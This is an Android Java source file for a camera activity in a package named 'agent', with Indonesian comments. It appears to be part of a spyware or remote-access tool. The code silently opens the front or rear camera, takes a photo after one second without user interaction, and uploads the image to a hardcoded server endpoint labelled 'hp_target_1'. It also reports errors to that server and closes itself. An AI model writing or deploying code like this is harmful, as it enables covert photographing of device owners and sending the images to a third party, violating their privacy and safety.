package com.ezax.agent;

import android.Manifest;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraActivity extends AppCompatActivity {
    private Camera camera;
    private int cameraId = 0;
    private boolean isFront = false;
    private String serverUrl = "http://192.168.1.17:5000"; // IP KAMU

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            kirimError("Izin Kamera Ditolak!");
            finish(); return;
        }

        isFront = getIntent().getBooleanExtra("FRONT", false);

        try {
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            for (int camIdx = 0; camIdx < Camera.getNumberOfCameras(); camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { cameraId = camIdx; break; }
                else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) { cameraId = camIdx; break; }
            }

            camera = Camera.open(cameraId);
            camera.startPreview(); // Tetap start preview walau tanpa layar

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    camera.takePicture(null, null, (data, cam) -> {
                        uploadImage(data);
                    });
                } catch (Exception e) {
                    kirimError("Gagal Jepret: " + e.getMessage());
                    finish();
                }
            }, 1000);

        } catch (Exception e) {
            kirimError("Kamera Error: " + e.getMessage());
            finish();
        }
    }

    // Fungsi buat lapor error ke Web
    private void kirimError(String pesanError) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/upload_result/hp_target_1");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                String json = "{\"type\":\"camera_error\", \"data\":\"" + pesanError + "\"}";
                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes("UTF-8"));
                os.close();
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }

    private void uploadImage(byte[] imageBytes) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/upload_image/hp_target_1");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "***";
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"image\";filename=\"image.jpg\"\r\n\r\n");
                request.write(imageBytes);
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush(); request.close();
                conn.getResponseCode();
            } catch (Exception e) { }
            
            // Kasih jeda 3 detik sebelum nutup aplikasi, biar upload selesai
            try { Thread.sleep(3000); } catch (Exception e) {}
            runOnUiThread(this::finish); 
        }).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (camera != null) {
            try { camera.stopPreview(); camera.release(); } catch (Exception e) {}
            camera = null;
        }
    }
}
